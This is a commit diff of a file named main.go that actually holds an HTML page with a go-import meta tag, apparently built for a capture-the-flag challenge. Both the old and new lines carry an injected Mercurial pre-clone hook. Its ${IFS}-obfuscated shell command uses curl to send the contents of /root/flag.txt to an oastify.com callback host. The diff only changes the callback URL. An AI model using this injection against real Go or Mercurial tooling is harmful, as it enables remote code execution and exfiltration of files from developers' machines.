c1d80c22eb47d24e316a55eefdf9dd0ad754c36f
Abdallah-Almahdy <140536488+Abdallah-Almahdy@users.noreply.github.com>
2025-08-10 23:27:46 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,5 +1,5 @@
 <html>
   <head>
-    <meta name="go-import" content="4.tcp.eu.ngrok.io:19907/pkg hg --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}https://b3fl1pr5ytl8714wd4w1d63scjia61uq.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
+    <meta name="go-import" content="4.tcp.eu.ngrok.io:19907/pkg hg --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}https://r4w125slz9mo8h5cekxhem48dzjq7iv7.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
   </head>
 </html>
